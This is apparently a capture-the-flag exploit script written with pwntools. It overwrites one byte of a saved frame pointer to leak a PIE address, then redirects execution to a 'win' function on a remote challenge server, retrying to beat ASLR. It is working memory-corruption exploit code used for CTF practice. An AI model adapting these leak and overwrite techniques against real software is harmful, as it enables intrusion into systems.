
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./chall")
context.binary = exe
# context.log_level = 'debug' # Enable for detailed I/O

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript='''
                # Break after first getname, before puts(s) in main
                # e.g. b *main+91 
                # c
            ''')
            pause()
    else:
        r = remote("209.38.56.153", 9991) # Replace with actual remote
    return r

def attempt_exploit(r):
    # Assumes connection 'r' is fresh and at the start of interaction.
    
    # 1. Initial server outputs
    r.recvuntil(b"Hello old chap spiffing pleased to meet you\n")
    r.recvuntil(b"What's your name? ")

    # 2. Trigger RBP LSB corruption
    r.sendline(b"A"*8)

    # 3. Read the potential leak from puts(s)
    #    puts(s) outputs: LEAK_VALUE\n
    #    Then printf outputs: Sorry didn't quite catch that...
    try:
        # Read everything up to "Sorry", then drop "Sorry"
        intermediate_output = r.recvuntil(b"Sorry", drop=True, timeout=2)
        # The last full line before "Sorry" (if any) should be the leak.
        # If puts(s) printed an empty string (first char was null), intermediate_output would be just "\n"
        # or if it printed "ABC", it would be "ABC\n"
        parts = intermediate_output.strip().split(b'\n')
        potential_leak_bytes = parts[0] if parts else b""

    except PwnlibException as e:
        print(f"[-] Timeout or error receiving leak: {e}")
        return False # Failed this attempt

    print(f"Potential leak bytes: {potential_leak_bytes}")

    if len(potential_leak_bytes) < 2: # Need at least 2 bytes for a 0xDF10 check
        print(f"[-] Leak too short or empty: {potential_leak_bytes}")
        return False

    leaked_addr_val = u64(potential_leak_bytes.ljust(8, b'\x00'))
    print(f"Interpreted leaked qword: {leaked_addr_val:#x}")

    # 4. Check if it's the "lucky" PIE leak
    is_pie_prefix = ((leaked_addr_val >> 40) == 0x55 or \
                     (leaked_addr_val >> 40) == 0x56)

    if is_pie_prefix:
        print(f"[+] SUCCESS: Target PIE leak detected: {leaked_addr_val:#x}")
        
        pie_base = leaked_addr_val - exe.symbols['getname'] # Crucial assumption based on hint
        exe.address = pie_base
        win_addr = exe.symbols['win']
        
        # print(f"    Calculated PIE base: {exe.address:#x}")
        print(f"    Calculated &win: {win_addr:#x}")

        # Consume the rest of the "Sorry..." prompt before sending next payload
        r.clean()
        if False:
            gdb.attach(r)
            pause()

        # 5. Perform the overflow
        #payload = b'A' * 24 + p64(win_addr)       # Return address -> win()
        #payload = cyclic(24)
        payload = p64(win_addr) 
        r.sendline(payload)


        r.sendline(b'A'*8) # flus out the last part?
        r.interactive() # Hopefully get the flag
        return True # Exploit succeeded
    else:
        print(f"[-] Leak {leaked_addr_val:#x} is not the target.")
        if not is_pie_prefix: print("    Reason: Not a PIE prefix.")
        return False # Failed this attempt

def main():
    max_attempts = 30 # More attempts for remote due to ASLR
    for attempt in range(1, max_attempts + 1):
        print(f"[*] Attempt {attempt}/{max_attempts}...")
        r = conn()
        try:
            if attempt_exploit(r):
                print("[+] Exploit successful!")
                sys.exit(0) # Exit if successful
            else:
                print("[-] Exploit attempt failed.")
                r.close()
        except Exception as e:
            print(f"[!] Exception during attempt {attempt}: {e}")
            if 'r' in locals() and r and not r.closed:
                r.close()
        
        if attempt < max_attempts and not args.LOCAL : # Small delay before retrying remote
            print("[*] Waiting a moment before retrying...")
            time.sleep(0.5) 

    print("[!] All exploit attempts failed.")

if __name__ == "__main__":
    main()
